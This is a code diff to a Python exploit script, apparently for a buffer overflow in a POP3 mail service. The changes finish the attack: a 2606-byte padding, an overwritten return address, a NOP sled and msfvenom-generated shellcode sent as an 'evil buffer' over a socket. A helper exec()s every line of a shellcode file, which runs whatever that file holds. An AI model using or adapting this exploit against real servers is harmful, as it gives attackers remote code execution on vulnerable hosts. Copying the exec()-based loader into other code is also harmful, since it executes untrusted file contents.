@@ -53,10 +53,11 @@ def pwn(ip, port, payload):
         buff = 'A' * 2606 + 'BBBB' + good_chars
     elif payload == 'break':
         print("[*] Payload set to breakpoint on entry to shellcode section")
-        buff = '\x41' * 2606 + struct.pack('<L', 0x5f4a358f) + '\xcc' + 'C' * 350
+        buff = '\x41' * 2606 + struct.pack('<L', 0x5f4a358f) + '\xcc' * 8 + 'C' * 350
     else:
+        shellcode = get_shellcode(payload)
         print("[*] Payload set to attack")
-        buff = '\x41' * 2606 + struct.pack('<L', 0x5f4a358f) + '\xcc' + 'C' * 350
+        buff = '\x41' * 2606 + struct.pack('<L', 0x5f4a358f) + '\x90' * 8 + shellcode
 
     try:
         print("[*] Sending evil buffer...")
@@ -72,3 +73,13 @@ def pwn(ip, port, payload):
         print("[*] ERROR: Cannot connect to POP3 on IP {}:{}".format(ip, port))
 
     s.close()
+
+def get_shellcode(location):
+    """ Read an msfvenom genterated shellcode file and format it to be sent.
+
+    """
+    with open(location) as shellfile:
+        for line in shellfile:
+            exec(line)
+
+    return buf
